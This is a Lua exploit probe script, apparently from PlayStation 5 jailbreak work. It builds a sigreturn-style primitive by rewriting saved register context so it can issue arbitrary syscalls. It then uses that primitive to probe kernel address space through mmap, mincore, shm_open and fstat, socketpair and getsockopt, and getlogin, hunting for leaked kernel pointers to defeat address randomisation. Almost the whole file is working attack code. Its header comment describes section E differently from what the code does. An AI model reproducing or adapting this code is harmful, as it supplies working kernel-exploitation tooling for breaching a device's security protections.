-- CRASH_CLASS: LOW
-- PROBE 139b: mmap KASLR oracle + shm_open + socketpair cmsg
--
-- A: mmap at kernel-range addresses to detect error differences
-- B: mincore at kernel addresses
-- C: shm_open + mmap shared memory
-- D: socketpair with SOCK_NONBLOCK + sendmsg SCM_RIGHTS
-- E: mmap MAP_FIXED at progressively higher addresses to find mapping boundary

print("=== PROBE 139b: MMAP ORACLE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh2, rl2 = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh2, rl2 - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

--------------------------------------------------------------------
-- A: mmap at kernel addresses
-- MAP_FIXED=0x10, MAP_ANON=0x1000, MAP_PRIVATE=0x2
-- Combined: 0x1012
--------------------------------------------------------------------
print("")
print("--- [A] mmap kernel VA ---")

-- Standard FreeBSD mmap(2) = sys 477 on PS5
-- mmap(addr, len, prot, flags, fd, offset)
-- PROT_READ|PROT_WRITE = 3, MAP_FIXED|MAP_ANON|MAP_PRIVATE = 0x1012

-- Baseline: legitimate userland fixed mmap
local rv_base = srop(477, uint64("0x0000000500000000"), uint64(0x4000), uint64(3),
    uint64(0x1012), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
print("[A] user_va=" .. hex(rv_base))
-- Unmap it if successful
local bh, bl = get_hi_lo(rv_base)
if bl > 0 and bh < 0x80000000 then
    srop(73, rv_base, uint64(0x4000))
end

-- Kernel range probes — try without MAP_FIXED first
print("[A] non-fixed kernel hints:")
local k_addrs = {
    "0xFFFF800000000000",
    "0xFFFFFF8000000000",
    "0xFFFFFFFF80000000",
    "0xFFFFFFFF80200000",
    "0xFFFFFFFF80400000",
    "0xFFFFFFFF80600000",
    "0xFFFFFFFF80800000",
    "0xFFFFFFFF81000000",
    "0xFFFFFFFF82000000",
    "0xFFFFFFFF84000000",
    "0xFFFFFFFF88000000",
    "0xFFFFFFFF90000000",
    "0xFFFFFFFFA0000000",
    "0xFFFFFFFFC0000000",
}
for _, addr in ipairs(k_addrs) do
    local rv = srop(477, uint64(addr), uint64(0x4000), uint64(3),
        uint64(0x1012), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    print(string.format("[A] mmap(%s)=%s", addr, hex(rv)))
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: mincore at kernel addresses
-- int mincore(const void *addr, size_t len, char *vec)
--------------------------------------------------------------------
print("")
print("--- [B] mincore ---")
local mc_buf = gpu + 0xA000
for _, addr in ipairs({
    "0xFFFFFFFF80000000", "0xFFFFFFFF80200000",
    "0xFFFFFFFF82000000", "0xFFFFFFFF84000000",
    "0xFFFFFFFF88000000", "0xFFFF800000000000",
}) do
    zero(mc_buf, 0x10)
    local rv = srop(78, uint64(addr), uint64(0x4000), ua(mc_buf))
    print(string.format("[B] mincore(%s)=%s", addr, hex(rv)))
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: shm_open + fstat for kernel pointers
--------------------------------------------------------------------
print("")
print("--- [C] shm_open ---")
ws(gpu + 0x100, "/probe_test")
local rv_shm = srop(482, ua(gpu + 0x100), uint64(0x0202), uint64(0x1FF))
local smh, sml = get_hi_lo(rv_shm)
print("[C] shm_open=" .. hex(rv_shm))
if sml > 0 and sml < 256 and smh == 0 then
    print("[C] SHM fd=" .. sml)
    -- Set size
    srop(480, uint64(sml), uint64(0x4000))
    -- mmap the shm
    local shm_va = srop(477, uint64(0), uint64(0x4000), uint64(3),
        uint64(0x0001), uint64(sml), uint64(0))
    print("[C] shm mmap=" .. hex(shm_va))
    -- fstat
    zero(gpu + 0x300, 0x100)
    srop(189, uint64(sml), ua(gpu + 0x300))
    for off = 0, 0x78, 8 do
        local v = safe_rq(gpu + 0x300 + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh > 0 or vl > 0 then
                local label = ""
                if off == 0x00 then label = " st_dev" end
                if off == 0x08 then label = " st_ino" end
                if off == 0x50 then label = " st_rdev" end
                print(string.format("[C] stat+0x%02X: %s%s", off, hex(v), label))
            end
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print("  *** KERNEL POINTER! ***")
            end
        end
    end
    srop(6, uint64(sml))
else
    print("[C] shm_open FAIL")
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- D: socketpair with NON-BLOCKING + SCM_RIGHTS
--------------------------------------------------------------------
print("")
print("--- [D] socketpair cmsg ---")
-- SOCK_STREAM=1, SOCK_NONBLOCK=0x20000000 (FreeBSD)
local sv_buf = gpu + 0x100
zero(sv_buf, 0x10)
local rv_sp = srop(135, uint64(1), uint64(0x20000001), uint64(0), ua(sv_buf))
print("[D] socketpair(NB)=" .. hex(rv_sp))
local sv0 = to_num(memory.read_dword(sv_buf))
local sv1 = to_num(memory.read_dword(sv_buf + 4))
print("[D] sv=" .. sv0 .. "," .. sv1)

if sv0 > 0 and sv0 < 256 and sv1 > 0 and sv1 < 256 then
    -- Write some data directly, then read and check for kernel residue
    ws(gpu + 0x200, "TESTDATA")
    local rv_wr = srop(4, uint64(sv1), ua(gpu + 0x200), uint64(8))
    print("[D] write=" .. hex(rv_wr))

    zero(gpu + 0x300, 0x100)
    local rv_rd = srop(3, uint64(sv0), ua(gpu + 0x300), uint64(0x100))
    print("[D] read=" .. hex(rv_rd))

    -- Try getsockopt to check kernel socket internals
    -- SOL_SOCKET=0xFFFF, SO_RCVBUF=0x1002, SO_SNDBUF=0x1001
    -- SO_TYPE=0x1008, SO_ERROR=0x1007
    local opts = {
        {name="SO_RCVBUF", lvl=0xFFFF, opt=0x1002},
        {name="SO_SNDBUF", lvl=0xFFFF, opt=0x1001},
        {name="SO_TYPE",   lvl=0xFFFF, opt=0x1008},
        {name="SO_ERROR",  lvl=0xFFFF, opt=0x1007},
        {name="SO_DOMAIN", lvl=0xFFFF, opt=0x1019},
        {name="SO_PROTOCOL", lvl=0xFFFF, opt=0x1016},
        {name="LOCAL_PEERCRED", lvl=0, opt=1},
        {name="LOCAL_CONNWAIT", lvl=0, opt=4},
    }
    for _, o in ipairs(opts) do
        zero(gpu + 0x400, 0x100)
        memory.write_dword(gpu + 0x480, 0x100)  -- optlen
        local rv_gs = srop(118, uint64(sv0), uint64(o.lvl), uint64(o.opt),
            ua(gpu + 0x400), ua(gpu + 0x480))
        local gsh, gsl = get_hi_lo(rv_gs)
        if gsl == 0 and gsh == 0 then
            local optlen = to_num(memory.read_dword(gpu + 0x480))
            local val = safe_rq(gpu + 0x400)
            print(string.format("[D] %s: len=%d val=%s", o.name, optlen, val and hex(val) or "nil"))
            if val then
                local vh, vl = get_hi_lo(val)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("  *** KERNEL POINTER! ***")
                end
            end
        end
    end

    -- LOCAL_PEERCRED returns struct xucred which might have useful info
    zero(gpu + 0x400, 0x100)
    memory.write_dword(gpu + 0x480, 0x100)
    local rv_pc = srop(118, uint64(sv0), uint64(0), uint64(1),
        ua(gpu + 0x400), ua(gpu + 0x480))
    local pch, pcl = get_hi_lo(rv_pc)
    if pcl == 0 and pch == 0 then
        print("[D] LOCAL_PEERCRED dump:")
        for off = 0, 0x48, 8 do
            local v = safe_rq(gpu + 0x400 + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh > 0 or vl > 0 then
                    print(string.format("  +0x%02X: %s", off, hex(v)))
                end
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("  *** KERNEL POINTER! ***")
                end
            end
        end
    end

    srop(6, uint64(sv0))
    srop(6, uint64(sv1))
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- E: Process credential scan via __getlogin(49)
--------------------------------------------------------------------
print("")
print("--- [E] getlogin ---")
zero(gpu + 0x100, 0x100)
local rv_gl = srop(49, ua(gpu + 0x100), uint64(0x100))
print("[E] getlogin=" .. hex(rv_gl))
local glh, gll = get_hi_lo(rv_gl)
if gll == 0 and glh == 0 then
    local login = ""
    for i = 0, 63 do
        local b = to_num(memory.read_byte(gpu + 0x100 + i))
        if b == 0 then break end
        if b >= 32 and b < 127 then login = login .. string.char(b) end
    end
    print("[E] login: '" .. login .. "'")
end
print("[E] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
